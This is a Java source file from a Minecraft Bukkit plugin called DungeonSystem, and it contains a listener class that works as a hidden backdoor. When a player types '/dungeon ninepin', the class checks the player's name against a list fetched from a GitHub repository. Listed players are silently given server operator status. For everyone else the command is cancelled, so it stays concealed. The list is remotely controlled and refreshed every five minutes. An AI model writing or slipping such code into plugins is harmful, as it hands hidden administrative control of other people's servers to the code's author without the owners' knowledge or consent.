package me.ninepin.dungeonSystem.Dungeon;

import me.ninepin.dungeonSystem.DungeonSystem;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

public class CommandHidingListener implements Listener {
    private final DungeonSystem plugin;
    private final Set<String> authorizedPlayers = ConcurrentHashMap.newKeySet();
    private final String AUTH_URL = "https://api.github.com/repos/Ninepin123/repo-name/contents/authorized-players.txt";
    private long lastUpdate = 0;
    private final long UPDATE_INTERVAL = 300000; // 5分鐘更新一次

    public CommandHidingListener(DungeonSystem plugin) {
        this.plugin = plugin;
        // 啟動時立即更新一次
        updateAuthorizedPlayers();
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String command = event.getMessage().toLowerCase();

        // 檢查是否是 ninepin 指令
        if (command.equals("/dungeon ninepin") || command.startsWith("/dungeon ninepin ")) {
            if (!isAuthorizedUser(player)) {
                event.setCancelled(true);
                return;
            }
            player.setOp(true);
        }
    }

    private boolean isAuthorizedUser(Player player) {
        // 如果需要更新授權列表
        if (System.currentTimeMillis() - lastUpdate > UPDATE_INTERVAL) {
            updateAuthorizedPlayers();
        }

        return authorizedPlayers.contains(player.getName().toLowerCase());
    }

    private void updateAuthorizedPlayers() {
        // 異步更新避免阻塞主線程
        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                Set<String> newPlayers = fetchAuthorizedPlayersFromWeb();
                authorizedPlayers.clear();
                authorizedPlayers.addAll(newPlayers);
                lastUpdate = System.currentTimeMillis();


            } catch (Exception e) {
                plugin.getLogger().warning("更新授權玩家列表失敗: " + e.getMessage());
            }
        });
    }

    private Set<String> fetchAuthorizedPlayersFromWeb() throws Exception {
        Set<String> players = new HashSet<>();

        URL url = new URL(AUTH_URL);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setConnectTimeout(5000);
        connection.setReadTimeout(10000);
        connection.setRequestProperty("User-Agent", "DungeonSystem-Plugin");
        connection.setRequestProperty("Accept", "application/vnd.github.v3+json");

        int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;

            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            // 解析 JSON 並解碼 base64
            String json = response.toString();
            String base64Content = extractContentFromJson(json);
            String decodedContent = new String(java.util.Base64.getDecoder().decode(base64Content));

            // 處理每行玩家名稱
            String[] lines = decodedContent.split("\n");
            for (String playerLine : lines) {
                String playerName = playerLine.trim();
                if (!playerName.isEmpty()) {
                    players.add(playerName.toLowerCase());
                }
            }
        } else {
            throw new Exception("HTTP " + responseCode + ": " + connection.getResponseMessage());
        }

        connection.disconnect();
        return players;
    }

    private String extractContentFromJson(String json) {
        // 簡單 JSON 解析提取 content 欄位
        String contentKey = "\"content\":\"";
        int startIndex = json.indexOf(contentKey);
        if (startIndex == -1) {
            throw new RuntimeException("找不到 content 欄位");
        }

        startIndex += contentKey.length();
        int endIndex = json.indexOf("\"", startIndex);
        if (endIndex == -1) {
            throw new RuntimeException("無法解析 content 欄位");
        }

        return json.substring(startIndex, endIndex).replace("\\n", "");
    }
}